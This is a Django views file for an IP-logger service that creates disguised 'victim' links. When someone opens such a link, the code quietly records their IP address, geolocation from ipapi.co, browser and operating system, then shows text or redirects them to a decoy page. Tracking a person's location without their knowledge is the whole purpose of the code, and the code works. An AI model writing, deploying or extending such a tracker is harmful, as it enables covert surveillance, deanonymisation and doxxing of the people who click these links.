from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
from logger.models import Loggers, catched
from django.contrib.auth import authenticate, login
from django.views.decorators.csrf import csrf_protect
from logger.forms import LoginForm
import httpagentparser
import ipaddress
import requests
import random
import string
import json
# Create your views here.


def index(request):
    form = LoginForm()
    if request.user.is_authenticated:
        return HttpResponseRedirect("/profile")
    if 'reason' in request.GET.keys():
        reason = request.GET['reason'] if 'reason' in request.GET.keys() else ''
        return render(request, 'forms/login.html', {'form': form, 'error_type': reason})
    return render(request, 'forms/login.html', {'form': form, 'error_type': ''})


def profile_view(request):
    if request.user.is_authenticated:
        query_result = Loggers.objects.filter(admin_username=request.user.username)
        return render(request, "profile/index.html",
                      context={"username": request.user.username, "query_result": query_result})
    return HttpResponseRedirect("/")


@csrf_protect
def login_view(request):
    if request.method == 'POST':
        url_error = "/?reason=Invalid login or password!"
        form = LoginForm(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            user = authenticate(username=cd['username'], password=cd['password'])
            if user is not None:
                if user.is_active:
                    login(request, user)
                    return HttpResponseRedirect("/profile")
                else:
                    return HttpResponseRedirect(url_error)
            else:
                return HttpResponseRedirect(url_error)


def admin_url_view(request, admin_url):
    if request.user.is_authenticated:
        query_to_check = Loggers.objects.filter(admin_url=admin_url).first()
        if request.user.username == query_to_check.admin_username:
            query_result = catched.objects.filter(admin_url_connected=admin_url)
            data = {"query_results": query_result,
                    "victim_url": "http://" + str(request.get_host()) + "/catch/" + Loggers.objects.filter(
                        admin_url=admin_url).first().victim_url
                    }
            return render(request, "view_res/index.html", context=data)
    return HttpResponseRedirect("/")


def create_logger_view(request, type_, asset):
    if request.user.is_authenticated:
        b = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
        a = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
        while Loggers.objects.filter(victim_url=b).exists():
            b = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
        while Loggers.objects.filter(victim_url=a).exists():
            a = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
        response_data = {
            'admin_url': a
        }
        Loggers.objects.create(victim_url=b, admin_url=a, admin_username=request.user.username, type=type_, asset=asset)
        return HttpResponse(json.dumps(response_data), status=200)


def delete_logger(request, id_):
    if request.user.is_authenticated:
        obj = Loggers.objects.filter(admin_url=id_)
        if obj.exists():
            if obj.first().admin_username == request.user.username:
                obj.first().delete()
                return HttpResponse(200)
        return HttpResponse('Not found', status=404)
    return HttpResponse('Unauthorized', status=401)


def catch_ip(request, victim_url):  # TODO: make support for images
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')
    if ipaddress.ip_address(ip).is_private:  # we don't request API if IP is private
        query_result = Loggers.objects.filter(victim_url=victim_url).first()
        match query_result.type:
            case "text":
                data = {"print_info": query_result.asset, "type": query_result.type}
                return render(request, "catch/index.html", context=data)
            case "url":
                return HttpResponseRedirect("https://" + query_result.asset)
    else:
        ip_info: dict = requests.get(f"https://ipapi.co/{ip}/json/").json()
        if Loggers.objects.filter(victim_url=victim_url).exists():  # check if logger was even created
            if "error" not in ip_info.keys(): # if API was request successfully
                query_result = Loggers.objects.filter(victim_url=victim_url).first()
                user_agent = httpagentparser.simple_detect(request.META['HTTP_USER_AGENT'])
                if not catched.objects.filter(ip=ip,
                                              admin_url_connected=Loggers.objects.filter(victim_url=victim_url).first().admin_url,
                                              user_agent=request.META['HTTP_USER_AGENT']).exists():
                    new_entry = catched(ip=ip,
                                        admin_url_connected=Loggers.objects.filter(victim_url=victim_url).first().admin_url,
                                        country=ip_info["country_name"],
                                        city=ip_info["city"],
                                        languages=ip_info["languages"],
                                        user_agent=request.META['HTTP_USER_AGENT'],
                                        OS=user_agent[0],
                                        browser=user_agent[1])
                    new_entry.save()
                    match query_result.type:
                        case "text":
                            data = {"print_info": query_result.asset, "type": query_result.type}
                            return render(request, "catch/index.html", context=data)
                        case "url":
                            return HttpResponseRedirect("https://" + query_result.asset)

            else:
                return HttpResponseRedirect('/')
        else:
            return HttpResponseRedirect('/')
